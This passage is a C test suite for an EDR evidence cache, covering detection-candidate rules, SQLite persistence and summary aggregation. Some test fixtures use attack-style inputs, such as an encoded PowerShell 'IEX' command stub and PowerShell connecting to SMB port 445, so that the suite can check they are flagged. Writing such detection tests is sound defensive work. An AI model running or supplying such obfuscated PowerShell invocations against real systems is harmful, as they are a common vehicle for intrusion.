#include "edr/behavior_record.h"
#include "edr/local_evidence_cache.h"
#include "edr/p0_rule_match.h"
#include "edr/process_tree_cache.h"
#include "cJSON.h"

#include <assert.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#if defined(_WIN32)
#include <windows.h>
static void test_setenv(const char *name, const char *value) {
  assert(_putenv_s(name, value) == 0);
}
static void test_unsetenv(const char *name) { assert(_putenv_s(name, "") == 0); }
#else
#include <pthread.h>
#include <unistd.h>
static void test_setenv(const char *name, const char *value) {
  assert(setenv(name, value, 1) == 0);
}
static void test_unsetenv(const char *name) { assert(unsetenv(name) == 0); }
#endif

#if defined(EDR_HAVE_SQLITE)
#include <sqlite3.h>
#endif

bool edr_resource_preprocess_throttle_active(void) { return false; }
uint64_t edr_monotonic_ns(void) { return 1000000000ull; }

static int make_test_sqlite_path(char *out, size_t cap) {
#if defined(_WIN32)
  char temp[MAX_PATH];
  char file[MAX_PATH];
  DWORD temp_len = GetTempPathA((DWORD)sizeof(temp), temp);
  if (!out || cap == 0u || !temp_len || temp_len >= sizeof(temp) ||
      !GetTempFileNameA(temp, "edr", 0u, file)) {
    return -1;
  }
  if ((size_t)snprintf(out, cap, "%s", file) >= cap) {
    (void)remove(file);
    return -1;
  }
  return 0;
#else
  char pattern[] = "/tmp/edr-local-evidence-XXXXXX";
  int fd;
  if (!out || cap == 0u || (fd = mkstemp(pattern)) < 0) return -1;
  close(fd);
  if ((size_t)snprintf(out, cap, "%s", pattern) >= cap) {
    (void)remove(pattern);
    return -1;
  }
  return 0;
#endif
}

static void cleanup_test_sqlite_path(const char *db) {
  char sidecar[640];
  int n;
  if (!db || !db[0]) return;
  (void)remove(db);
  n = snprintf(sidecar, sizeof(sidecar), "%s-wal", db);
  if (n > 0 && (size_t)n < sizeof(sidecar)) (void)remove(sidecar);
  n = snprintf(sidecar, sizeof(sidecar), "%s-shm", db);
  if (n > 0 && (size_t)n < sizeof(sidecar)) (void)remove(sidecar);
}

static void init_record(EdrBehaviorRecord *r, EdrEventType t) {
  edr_behavior_record_init(r);
  r->type = t;
  r->priority = 1u;
  r->pid = 4242u;
}

/* Local-cache enrichment requires the same authoritative tuple as production
 * P0 records.  Legacy PID-only process-tree entries are deliberately unknown
 * and must not make these tests accidentally prove a cross-generation copy. */
static int put_generation(uint32_t pid, uint32_t ppid, const char *name,
                          const char *cmdline, const char *path,
                          const char *parent_name, uint64_t start_time_ns,
                          uint64_t start_key) {
  return edr_pt_cache_put_generation(
      pid, ppid, name, cmdline, path, parent_name, start_time_ns, start_key,
      133700000000000000ULL + start_key);
}

static void set_record_generation(EdrBehaviorRecord *r, uint64_t start_key) {
  assert(r != NULL);
  r->process_start_key = start_key;
  r->process_creation_filetime_100ns = 133700000000000000ULL + start_key;
}

static void test_checknetisolation_standard_low_risk_is_not_candidate(void) {
  EdrBehaviorRecord r;
  init_record(&r, EDR_EVENT_NET_CONNECT);
  snprintf(r.process_name, sizeof(r.process_name), "CheckNetIsolation.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "C:\\Windows\\System32\\CheckNetIsolation.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "CheckNetIsolation.exe LoopbackExempt -a -n=Microsoft.Test");
  snprintf(r.net_dst, sizeof(r.net_dst), "127.0.0.1");
  r.net_dport = 80u;
  assert(edr_local_evidence_cache_is_candidate(&r) == 0);
}

static void test_checknetisolation_high_risk_port_is_candidate(void) {
  EdrBehaviorRecord r;
  init_record(&r, EDR_EVENT_NET_CONNECT);
  snprintf(r.process_name, sizeof(r.process_name), "CheckNetIsolation.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "C:\\Windows\\System32\\CheckNetIsolation.exe");
  snprintf(r.net_dst, sizeof(r.net_dst), "10.0.0.5");
  r.net_dport = 445u;
  assert(edr_local_evidence_cache_is_candidate(&r) == 1);
}

static void test_checknetisolation_p1_context_is_candidate(void) {
  EdrBehaviorRecord r;
  init_record(&r, EDR_EVENT_NET_CONNECT);
  snprintf(r.process_name, sizeof(r.process_name), "CheckNetIsolation.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "C:\\Windows\\System32\\CheckNetIsolation.exe");
  snprintf(r.detection_context, sizeof(r.detection_context), "{\"severity\":\"P1\"}");
  r.net_dport = 80u;
  assert(edr_local_evidence_cache_is_candidate(&r) == 1);
}

static void test_weak_file_event_is_not_candidate(void) {
  EdrBehaviorRecord r;
  init_record(&r, EDR_EVENT_FILE_WRITE);
  r.pid = 0u;
  snprintf(r.file_path, sizeof(r.file_path), "badname");
  assert(edr_local_evidence_cache_is_candidate(&r) == 0);
}

static void test_weak_file_event_p1_context_is_candidate(void) {
  EdrBehaviorRecord r;
  init_record(&r, EDR_EVENT_FILE_WRITE);
  r.pid = 0u;
  snprintf(r.file_path, sizeof(r.file_path), "badname");
  snprintf(r.detection_context, sizeof(r.detection_context), "{\"priority\":\"P1\"}");
  assert(edr_local_evidence_cache_is_candidate(&r) == 1);
}

static void test_high_signal_process_is_candidate(void) {
  EdrBehaviorRecord r;
  init_record(&r, EDR_EVENT_PROCESS_CREATE);
  snprintf(r.process_name, sizeof(r.process_name), "powershell.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "powershell.exe -NoProfile -EncodedCommand SQBFAFgA");
  assert(edr_local_evidence_cache_is_candidate(&r) == 1);
}

static void test_command_evidence_normalization_and_script_path(void) {
  char normalized[1024];
  char script_path[1024];
  const char *command =
      "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"  "
      "-NoProfile -File \"C:\\Ops\\Maintenance Script.ps1\"";
  edr_p0_normalize_command_for_evidence(command, normalized,
                                        sizeof(normalized));
  assert(strcmp(normalized,
                "c:/windows/system32/windowspowershell/v1.0/powershell.exe "
                "-noprofile -file c:/ops/maintenance script.ps1") == 0);
  assert(edr_p0_extract_script_path(command, script_path,
                                    sizeof(script_path)) == 1);
  assert(strcmp(script_path, "C:\\Ops\\Maintenance Script.ps1") == 0);
  assert(edr_p0_extract_script_path("powershell.exe -Command Get-Process",
                                    script_path, sizeof(script_path)) == 0);
}

static void test_nonstandard_checknetisolation_path_not_suppressed_by_p1_noise(void) {
  EdrBehaviorRecord r;
  init_record(&r, EDR_EVENT_NET_CONNECT);
  snprintf(r.process_name, sizeof(r.process_name), "CheckNetIsolation.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "C:\\Users\\Public\\CheckNetIsolation.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "CheckNetIsolation.exe LoopbackExempt");
  snprintf(r.detection_context, sizeof(r.detection_context), "{\"confidence\":0.9}");
  r.net_dport = 80u;
  assert(edr_local_evidence_cache_is_candidate(&r) == 1);
}

static int g_summary_count;
static EdrBehaviorRecord g_summary_last;

static void summary_capture(const EdrBehaviorRecord *r) {
  /* The aggregate is copied before this callback. Re-entering the cache
   * proves flush does not retain the cache mutex across caller code. */
  char status[512];
  edr_local_evidence_cache_status_json(status, sizeof(status));
  assert(status[0] != '\0');
  g_summary_count++;
  if (r) {
    g_summary_last = *r;
  }
}

static void test_behavior_summary_flush_coalesced_events(void) {
  g_summary_count = 0;
  memset(&g_summary_last, 0, sizeof(g_summary_last));
  const int64_t base_ns = 1779338600000000000LL; /* 固定时间，分钟对齐确定 */
  for (int i = 0; i < 6; i++) {
    EdrBehaviorRecord r;
    init_record(&r, EDR_EVENT_NET_CONNECT);
    r.pid = 7777u;
    r.event_time_ns = base_ns + (int64_t)i * 1000000LL; /* 同一分钟内 */
    snprintf(r.endpoint_id, sizeof(r.endpoint_id), "ep-sum-1");
    snprintf(r.process_name, sizeof(r.process_name), "telemetry.exe");
    snprintf(r.net_dst, sizeof(r.net_dst), "93.184.216.34");
    r.net_dport = 80u; /* 非高危端口 -> 普通事件 -> 进入聚合 */
    edr_local_evidence_cache_record_behavior(&r);
  }
  /* 窗口未关闭：当前分钟内 flush 不应产出。 */
  edr_local_evidence_cache_flush_summaries(base_ns + 1000000000LL, summary_capture);
  assert(g_summary_count == 0);
  /* 推进到下一分钟，窗口关闭：应产出一条摘要，count>=5。 */
  edr_local_evidence_cache_flush_summaries(base_ns + 60000000000LL, summary_capture);
  assert(g_summary_count == 1);
  assert(g_summary_last.type == EDR_EVENT_BEHAVIOR_SUMMARY);
  assert(g_summary_last.priority == 2u);
  assert(g_summary_last.pid == 7777u);
  assert(strstr(g_summary_last.detection_context, "\"type\":\"behavior_summary\"") != NULL);
  assert(strstr(g_summary_last.detection_context, "\"count\":6") != NULL);
  /* 再次 flush，槽位已清空，不应重复产出。 */
  edr_local_evidence_cache_flush_summaries(base_ns + 120000000000LL, summary_capture);
  assert(g_summary_count == 1);
}

static void test_behavior_summary_below_threshold_no_emit(void) {
  g_summary_count = 0;
  const int64_t base_ns = 1779341600000000000LL;
  for (int i = 0; i < 3; i++) { /* 低于默认阈值 5 */
    EdrBehaviorRecord r;
    init_record(&r, EDR_EVENT_NET_CONNECT);
    r.pid = 8888u;
    r.event_time_ns = base_ns + (int64_t)i * 1000000LL;
    snprintf(r.endpoint_id, sizeof(r.endpoint_id), "ep-sum-2");
    snprintf(r.process_name, sizeof(r.process_name), "telemetry.exe");
    snprintf(r.net_dst, sizeof(r.net_dst), "93.184.216.34");
    r.net_dport = 80u;
    edr_local_evidence_cache_record_behavior(&r);
  }
  edr_local_evidence_cache_flush_summaries(base_ns + 60000000000LL, summary_capture);
  assert(g_summary_count == 0);
}

static void test_identity_status_counter_basics(void) {
  assert(edr_local_evidence_cache_open(":memory:", 8u, 24u) == 0);
  struct timespec ts;
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  const int64_t generation_start = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec - 1000LL;
  edr_pt_cache_init();
  assert(put_generation(91002u, 1u, "identity.exe", "", "", "",
                        (uint64_t)generation_start, 0x91002u) == 0);
  EdrEvidenceCacheStatus st;
  edr_local_evidence_cache_get_status(&st);
  assert(st.identity_observations_total == 0u && st.process_slots_used <= st.process_slots_capacity);
  EdrBehaviorRecord miss;
  init_record(&miss, EDR_EVENT_PROCESS_CREATE);
  miss.pid = 91001u;
  edr_local_evidence_cache_enrich_behavior(&miss);
  edr_local_evidence_cache_get_status(&st);
  assert(st.process_cache_misses == 1u && st.identity_enrich_attempts == 1u && st.identity_cache_misses == 1u);
  EdrBehaviorRecord observed;
  init_record(&observed, EDR_EVENT_PROCESS_CREATE);
  observed.pid = 91002u;
  observed.event_time_ns = generation_start + 1000000LL;
  snprintf(observed.username, sizeof(observed.username), "SYSTEM");
  snprintf(observed.identity_quality, sizeof(observed.identity_quality), "target_4688");
  edr_local_evidence_cache_observe_process(&observed);
  EdrBehaviorRecord hit;
  init_record(&hit, EDR_EVENT_PROCESS_CREATE);
  hit.pid = 91002u;
  hit.event_time_ns = generation_start + 2000000LL;
  edr_local_evidence_cache_enrich_behavior(&hit);
  edr_local_evidence_cache_get_status(&st);
  assert(st.identity_observations_total == 1u && st.identity_target_4688 == 1u);
  assert(st.process_cache_hits == 1u && st.identity_cache_hits == 1u && st.identity_cache_misses == 1u);
  char json[4096];
  edr_local_evidence_cache_status_json(json, sizeof(json));
  assert(strstr(json, "\"observations_total\":1") != NULL);
  assert(strstr(json, "\"generation_unknown_rejects\"") != NULL);
  edr_local_evidence_cache_close();
}

#if defined(EDR_HAVE_SQLITE)
static uint64_t sqlite_table_count(const char *path, const char *table) {
  sqlite3 *db = NULL;
  sqlite3_stmt *stmt = NULL;
  char sql[96];
  uint64_t count = 0u;
  assert(sqlite3_open_v2(path, &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK);
  assert(snprintf(sql, sizeof(sql), "SELECT COUNT(*) FROM %s;", table) > 0);
  assert(sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK);
  assert(sqlite3_step(stmt) == SQLITE_ROW);
  count = (uint64_t)sqlite3_column_int64(stmt, 0);
  sqlite3_finalize(stmt);
  assert(sqlite3_close(db) == SQLITE_OK);
  return count;
}

static int sqlite_table_has_column(const char *path, const char *table, const char *column) {
  sqlite3 *db = NULL;
  sqlite3_stmt *stmt = NULL;
  char sql[128];
  int found = 0;
  assert(sqlite3_open_v2(path, &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK);
  assert(snprintf(sql, sizeof(sql), "PRAGMA table_info(%s);", table) > 0);
  assert(sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK);
  while (sqlite3_step(stmt) == SQLITE_ROW) {
    const char *name = (const char *)sqlite3_column_text(stmt, 1);
    if (name && strcmp(name, column) == 0) {
      found = 1;
      break;
    }
  }
  sqlite3_finalize(stmt);
  assert(sqlite3_close(db) == SQLITE_OK);
  return found;
}

static void sqlite_exec_create_legacy_cache(const char *path) {
  sqlite3 *db = NULL;
  char *error = NULL;
  const char *sql =
      "CREATE TABLE process_cache ("
      "endpoint_id TEXT NOT NULL,tenant_id TEXT,pid INTEGER NOT NULL,ppid INTEGER,"
      "name TEXT,path TEXT,cmdline TEXT,parent_name TEXT,parent_path TEXT,"
      "first_seen_ns INTEGER,last_seen_ns INTEGER,PRIMARY KEY(endpoint_id,pid));"
      "CREATE TABLE p0_candidates ("
      "id INTEGER PRIMARY KEY AUTOINCREMENT,candidate_id TEXT UNIQUE,endpoint_id TEXT,tenant_id TEXT,"
      "event_time_ns INTEGER,type INTEGER,pid INTEGER,ppid INTEGER,process_name TEXT,exe_path TEXT,"
      "cmdline TEXT,file_path TEXT,dns_query TEXT,net_dst TEXT,net_dport INTEGER,reg_key_path TEXT,"
      "reg_value_name TEXT,reg_op TEXT,detection_context TEXT,context_pre_count INTEGER,"
      "context_post_until_ns INTEGER,created_ns INTEGER);";
  assert(sqlite3_open(path, &db) == SQLITE_OK);
  assert(sqlite3_exec(db, sql, NULL, NULL, &error) == SQLITE_OK);
  sqlite3_free(error);
  assert(sqlite3_close(db) == SQLITE_OK);
}

static void sqlite_candidate_id_for_source_event(const char *path, const char *source_event_id,
                                                 char *out, size_t out_cap) {
  sqlite3 *db = NULL;
  sqlite3_stmt *stmt = NULL;
  unsigned matches = 0u;
  assert(out && out_cap > 0u);
  out[0] = '\0';
  assert(sqlite3_open_v2(path, &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK);
  assert(sqlite3_prepare_v2(db,
      "SELECT candidate_id,manifest_json FROM artifacts WHERE artifact_type='p0_context_bundle';",
      -1, &stmt, NULL) == SQLITE_OK);
  while (sqlite3_step(stmt) == SQLITE_ROW) {
    const char *candidate_id = (const char *)sqlite3_column_text(stmt, 0);
    const char *manifest = (const char *)sqlite3_column_text(stmt, 1);
    cJSON *json = cJSON_Parse(manifest ? manifest : "");
    cJSON *source = json ? cJSON_GetObjectItemCaseSensitive(json, "source_event_id") : NULL;
    if (cJSON_IsString(source) && source->valuestring &&
        strcmp(source->valuestring, source_event_id) == 0) {
      assert(candidate_id != NULL);
      snprintf(out, out_cap, "%s", candidate_id);
      matches++;
    }
    cJSON_Delete(json);
  }
  sqlite3_finalize(stmt);
  assert(sqlite3_close(db) == SQLITE_OK);
  assert(matches == 1u && out[0] != '\0');
}

static void sqlite_assert_candidate_enrichment(const char *path, const char *candidate_id,
                                                const char *exe_path, const char *start_key,
                                                const char *generation_source,
                                                const char *completeness) {
  sqlite3 *db = NULL;
  sqlite3_stmt *stmt = NULL;
  assert(sqlite3_open_v2(path, &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK);
  assert(sqlite3_prepare_v2(db,
      "SELECT exe_path,process_start_key,process_generation_source,source_completeness "
      "FROM p0_candidates WHERE candidate_id=?;", -1, &stmt, NULL) == SQLITE_OK);
  assert(sqlite3_bind_text(stmt, 1, candidate_id, -1, SQLITE_TRANSIENT) == SQLITE_OK);
  assert(sqlite3_step(stmt) == SQLITE_ROW);
  assert(strcmp((const char *)sqlite3_column_text(stmt, 0), exe_path) == 0);
  assert(strcmp((const char *)sqlite3_column_text(stmt, 1), start_key) == 0);
  assert(strcmp((const char *)sqlite3_column_text(stmt, 2), generation_source) == 0);
  assert(strcmp((const char *)sqlite3_column_text(stmt, 3), completeness) == 0);
  assert(sqlite3_step(stmt) == SQLITE_DONE);
  sqlite3_finalize(stmt);
  assert(sqlite3_close(db) == SQLITE_OK);
}

static void sqlite_assert_candidate_completeness(const char *path, const char *candidate_id,
                                                 const char *completeness,
                                                 const char *truncated_fields) {
  sqlite3 *db = NULL;
  sqlite3_stmt *stmt = NULL;
  assert(sqlite3_open_v2(path, &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK);
  assert(sqlite3_prepare_v2(db,
      "SELECT source_completeness,source_truncated_fields FROM p0_candidates WHERE candidate_id=?;",
      -1, &stmt, NULL) == SQLITE_OK);
  assert(sqlite3_bind_text(stmt, 1, candidate_id, -1, SQLITE_TRANSIENT) == SQLITE_OK);
  assert(sqlite3_step(stmt) == SQLITE_ROW);
  assert(strcmp((const char *)sqlite3_column_text(stmt, 0), completeness) == 0);
  assert(strcmp((const char *)sqlite3_column_text(stmt, 1), truncated_fields) == 0);
  sqlite3_finalize(stmt);
  assert(sqlite3_close(db) == SQLITE_OK);
}

static uint64_t sqlite_post_artifact_count(const char *path, const char *candidate_id,
                                           const char *source_event_id) {
  sqlite3 *db = NULL;
  sqlite3_stmt *stmt = NULL;
  uint64_t count = 0u;
  assert(sqlite3_open_v2(path, &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK);
  assert(sqlite3_prepare_v2(db,
      "SELECT manifest_json FROM artifacts WHERE artifact_type='post_context' AND candidate_id=?;",
      -1, &stmt, NULL) == SQLITE_OK);
  assert(sqlite3_bind_text(stmt, 1, candidate_id, -1, SQLITE_TRANSIENT) == SQLITE_OK);
  while (sqlite3_step(stmt) == SQLITE_ROW) {
    const char *manifest = (const char *)sqlite3_column_text(stmt, 0);
    cJSON *json = cJSON_Parse(manifest ? manifest : "");
    cJSON *source = json ? cJSON_GetObjectItemCaseSensitive(json, "source_event_id") : NULL;
    assert(json != NULL);
    if (cJSON_IsString(source) && source->valuestring &&
        strcmp(source->valuestring, source_event_id) == 0) {
      count++;
    }
    cJSON_Delete(json);
  }
  sqlite3_finalize(stmt);
  assert(sqlite3_close(db) == SQLITE_OK);
  return count;
}

static uint64_t sqlite_post_artifact_total(const char *path, const char *candidate_id) {
  sqlite3 *db = NULL;
  sqlite3_stmt *stmt = NULL;
  uint64_t count = 0u;
  assert(sqlite3_open_v2(path, &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK);
  assert(sqlite3_prepare_v2(db,
      "SELECT COUNT(*) FROM artifacts WHERE artifact_type='post_context' AND candidate_id=?;",
      -1, &stmt, NULL) == SQLITE_OK);
  assert(sqlite3_bind_text(stmt, 1, candidate_id, -1, SQLITE_TRANSIENT) == SQLITE_OK);
  assert(sqlite3_step(stmt) == SQLITE_ROW);
  count = (uint64_t)sqlite3_column_int64(stmt, 0);
  sqlite3_finalize(stmt);
  assert(sqlite3_close(db) == SQLITE_OK);
  return count;
}

static void sqlite_assert_all_artifact_manifests_parse(const char *path) {
  sqlite3 *db = NULL;
  sqlite3_stmt *stmt = NULL;
  assert(sqlite3_open_v2(path, &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK);
  assert(sqlite3_prepare_v2(db, "SELECT manifest_json FROM artifacts;", -1, &stmt, NULL) == SQLITE_OK);
  while (sqlite3_step(stmt) == SQLITE_ROW) {
    const char *manifest = (const char *)sqlite3_column_text(stmt, 0);
    cJSON *json = cJSON_Parse(manifest ? manifest : "");
    assert(json != NULL);
    cJSON_Delete(json);
  }
  sqlite3_finalize(stmt);
  assert(sqlite3_close(db) == SQLITE_OK);
}

static void sqlite_bundle_manifest_for_source_event(const char *path, const char *source_event_id,
                                                    char *out, size_t out_cap) {
  sqlite3 *db = NULL;
  sqlite3_stmt *stmt = NULL;
  unsigned matches = 0u;
  assert(out && out_cap > 0u);
  out[0] = '\0';
  assert(sqlite3_open_v2(path, &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK);
  assert(sqlite3_prepare_v2(db,
      "SELECT manifest_json FROM artifacts WHERE artifact_type='p0_context_bundle';",
      -1, &stmt, NULL) == SQLITE_OK);
  while (sqlite3_step(stmt) == SQLITE_ROW) {
    const char *manifest = (const char *)sqlite3_column_text(stmt, 0);
    cJSON *json = cJSON_Parse(manifest ? manifest : "");
    cJSON *source = json ? cJSON_GetObjectItemCaseSensitive(json, "source_event_id") : NULL;
    if (cJSON_IsString(source) && source->valuestring &&
        strcmp(source->valuestring, source_event_id) == 0) {
      snprintf(out, out_cap, "%s", manifest ? manifest : "");
      matches++;
    }
    cJSON_Delete(json);
  }
  sqlite3_finalize(stmt);
  assert(sqlite3_close(db) == SQLITE_OK);
  assert(matches == 1u && out[0] != '\0');
}

static void assert_manifest_generation(const char *manifest, const char *start_key,
                                       const char *creation, const char *source) {
  cJSON *root = cJSON_Parse(manifest ? manifest : "");
  cJSON *actual_start;
  cJSON *actual_creation;
  cJSON *actual_source;
  assert(root != NULL);
  actual_start = cJSON_GetObjectItemCaseSensitive(root, "process_start_key");
  actual_creation = cJSON_GetObjectItemCaseSensitive(
      root, "process_creation_filetime_100ns");
  actual_source = cJSON_GetObjectItemCaseSensitive(root, "process_generation_source");
  assert(cJSON_IsString(actual_start) && actual_start->valuestring &&
         strcmp(actual_start->valuestring, start_key) == 0);
  assert(cJSON_IsString(actual_creation) && actual_creation->valuestring &&
         strcmp(actual_creation->valuestring, creation) == 0);
  assert(cJSON_IsString(actual_source) && actual_source->valuestring &&
         strcmp(actual_source->valuestring, source) == 0);
  cJSON_Delete(root);
}

static void assert_manifest_source_truncation(const char *manifest,
                                              const char *source_completeness,
                                              const char *source_fields) {
  cJSON *root = cJSON_Parse(manifest ? manifest : "");
  cJSON *actual_completeness;
  cJSON *actual_fields;
  assert(root != NULL);
  actual_completeness = cJSON_GetObjectItemCaseSensitive(root, "source_completeness");
  actual_fields = cJSON_GetObjectItemCaseSensitive(root, "source_truncated_fields");
  assert(cJSON_IsString(actual_completeness) && actual_completeness->valuestring &&
         strcmp(actual_completeness->valuestring, source_completeness) == 0);
  assert(cJSON_IsString(actual_fields) && actual_fields->valuestring &&
         strcmp(actual_fields->valuestring, source_fields) == 0);
  cJSON_Delete(root);
}

static void test_candidate_commit_failure_leaves_no_dedupe_or_context_state(void) {
  const char *db = "local_evidence_cache_commit_failure.sqlite";
  (void)remove(db);
  (void)remove("local_evidence_cache_commit_failure.sqlite-wal");
  (void)remove("local_evidence_cache_commit_failure.sqlite-shm");
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);

  struct timespec ts;
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  EdrBehaviorRecord candidate;
  init_record(&candidate, EDR_EVENT_NET_CONNECT);
  candidate.priority = 3u;
  candidate.pid = 73101u;
  candidate.event_time_ns = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  snprintf(candidate.endpoint_id, sizeof(candidate.endpoint_id), "ep-commit-boundary");
  snprintf(candidate.event_id, sizeof(candidate.event_id), "commit-boundary-event");
  snprintf(candidate.process_name, sizeof(candidate.process_name), "powershell.exe");
  snprintf(candidate.net_dst, sizeof(candidate.net_dst), "10.0.0.55");
  candidate.net_dport = 445u;
  candidate.process_start_key = 0x73101u;
  candidate.process_creation_filetime_100ns = 133700000000000001ULL;

  edr_local_evidence_cache_test_fail_next_commits(1u);
  edr_local_evidence_cache_record_behavior(&candidate);
  EdrEvidenceCacheStatus failed;
  edr_local_evidence_cache_get_status(&failed);
  assert(failed.candidate_requests == 1u);
  assert(failed.candidate_reused == 0u);
  assert(failed.candidate_admission_attempts == 1u);
  assert(failed.candidate_admitted == 0u);
  assert(failed.candidate_rejected == 1u);
  assert(failed.candidate_transaction_failures == 1u);
  assert(failed.records_written == 0u && failed.p0_candidates_written == 0u);
  assert(failed.artifacts_written == 0u);
  assert(sqlite_table_count(db, "p0_candidates") == 0u);
  assert(sqlite_table_count(db, "artifacts") == 0u);

  /* A failed candidate must not leave a post-context window that upgrades a
   * following ordinary event into a persisted artifact. */
  EdrBehaviorRecord ordinary = candidate;
  ordinary.priority = 1u;
  ordinary.event_time_ns += 1000000LL;
  snprintf(ordinary.process_name, sizeof(ordinary.process_name), "telemetry.exe");
  ordinary.net_dport = 80u;
  edr_local_evidence_cache_record_behavior(&ordinary);
  EdrEvidenceCacheStatus after_ordinary;
  edr_local_evidence_cache_get_status(&after_ordinary);
  assert(after_ordinary.artifacts_written == 0u);
  assert(sqlite_table_count(db, "artifacts") == 0u);

  /* The identical candidate is an admission retry, not a reuse, because the
   * failed transaction was never allowed to populate the short-window index. */
  edr_local_evidence_cache_record_behavior(&candidate);
  EdrEvidenceCacheStatus committed;
  edr_local_evidence_cache_get_status(&committed);
  assert(committed.candidate_requests == 2u);
  assert(committed.candidate_reused == 0u);
  assert(committed.candidate_admission_attempts == 2u);
  assert(committed.candidate_admitted == 1u);
  assert(committed.candidate_rejected == 1u);
  assert(committed.candidate_transaction_failures == 1u);
  assert(committed.records_written == 1u && committed.p0_candidates_written == 1u);
  assert(committed.artifacts_written == 1u);
  assert(sqlite_table_count(db, "p0_candidates") == 1u);
  assert(sqlite_table_count(db, "artifacts") == 1u);

  /* This is deliberately only current-process, in-memory short-window reuse.
   * It makes no claim that a reopened database produces a cache hit. */
  edr_local_evidence_cache_record_behavior(&candidate);
  EdrEvidenceCacheStatus reused;
  edr_local_evidence_cache_get_status(&reused);
  assert(reused.candidate_requests == 3u);
  assert(reused.candidate_reused == 1u);
  assert(reused.candidate_admission_attempts == 2u);
  assert(reused.candidate_admitted == 1u);
  assert(reused.candidate_rejected == 1u);
  assert(sqlite_table_count(db, "p0_candidates") == 1u);

  char full_json[4096];
  edr_local_evidence_cache_status_json(full_json, sizeof(full_json));
  assert(strstr(full_json, "\"candidate_admission\"") != NULL);
  assert(strstr(full_json, "\"reuse_scope\":\"local_in_process_evidence\"") != NULL);
  assert(strstr(full_json, "\"utilization_bps\"") != NULL);
  assert(strstr(full_json, "\"oldest\"") != NULL);
  char full_document[4200];
  assert(snprintf(full_document, sizeof(full_document), "{%s}", full_json) > 0);
  cJSON *full_root = cJSON_Parse(full_document);
  assert(full_root != NULL);
  cJSON *full_cache = cJSON_GetObjectItemCaseSensitive(full_root, "evidence_cache");
  assert(cJSON_IsObject(full_cache));
  assert(cJSON_IsObject(cJSON_GetObjectItemCaseSensitive(full_cache, "candidate_admission")));
  assert(cJSON_IsObject(cJSON_GetObjectItemCaseSensitive(full_cache, "utilization_bps")));
  cJSON_Delete(full_root);
  char small_json[1600];
  edr_local_evidence_cache_status_json(small_json, sizeof(small_json));
  assert(small_json[0] != '\0');
  assert(small_json[strlen(small_json) - 1u] == '}');
  char small_document[1700];
  assert(snprintf(small_document, sizeof(small_document), "{%s}", small_json) > 0);
  cJSON *small_root = cJSON_Parse(small_document);
  assert(small_root != NULL);
  cJSON *small_cache = cJSON_GetObjectItemCaseSensitive(small_root, "evidence_cache");
  cJSON *small_status = cJSON_GetObjectItemCaseSensitive(small_cache, "status");
  assert(cJSON_IsObject(small_cache));
  assert(cJSON_IsString(small_status) && strcmp(small_status->valuestring, "truncated") == 0);
  cJSON_Delete(small_root);

  edr_local_evidence_cache_close();
  (void)remove(db);
  (void)remove("local_evidence_cache_commit_failure.sqlite-wal");
  (void)remove("local_evidence_cache_commit_failure.sqlite-shm");
}

static void test_context_write_budget_cannot_starve_later_candidate(void) {
  const char *db = "local_evidence_cache_write_budget.sqlite";
  struct timespec ts;
  EdrBehaviorRecord candidate;
  EdrBehaviorRecord context;
  EdrEvidenceCacheStatus status;
  int64_t base;

  (void)remove(db);
  (void)remove("local_evidence_cache_write_budget.sqlite-wal");
  (void)remove("local_evidence_cache_write_budget.sqlite-shm");
  test_setenv("EDR_EVIDENCE_CACHE_WRITE_BUDGET_PER_MIN", "8");
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  base = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);

  init_record(&candidate, EDR_EVENT_NET_CONNECT);
  candidate.priority = 3u;
  candidate.pid = 74101u;
  candidate.event_time_ns = base;
  candidate.process_start_key = UINT64_C(0x74101);
  candidate.process_creation_filetime_100ns = UINT64_C(133700000000074101);
  snprintf(candidate.endpoint_id, sizeof(candidate.endpoint_id), "ep-budget-reserve");
  snprintf(candidate.event_id, sizeof(candidate.event_id), "budget-candidate-a");
  snprintf(candidate.process_name, sizeof(candidate.process_name), "powershell.exe");
  snprintf(candidate.net_dst, sizeof(candidate.net_dst), "10.0.0.74");
  candidate.net_dport = 445u;
  edr_local_evidence_cache_record_behavior(&candidate);

  context = candidate;
  context.priority = 1u;
  context.net_dport = 80u;
  snprintf(context.process_name, sizeof(context.process_name), "telemetry.exe");
  snprintf(context.cmdline, sizeof(context.cmdline), "telemetry.exe --context");
  for (unsigned i = 0u; i < 6u; ++i) {
    context.event_time_ns = base + (int64_t)(i + 1u) * 1000000LL;
    snprintf(context.event_id, sizeof(context.event_id), "budget-context-%u", i);
    edr_local_evidence_cache_record_behavior(&context);
  }

  candidate.pid = 74102u;
  candidate.event_time_ns = base + 10000000LL;
  candidate.process_start_key = UINT64_C(0x74102);
  candidate.process_creation_filetime_100ns = UINT64_C(133700000000074102);
  snprintf(candidate.event_id, sizeof(candidate.event_id), "budget-candidate-b");
  edr_local_evidence_cache_record_behavior(&candidate);
  for (unsigned i = 0u; i < 4u; ++i) {
    candidate.pid = 74103u + i;
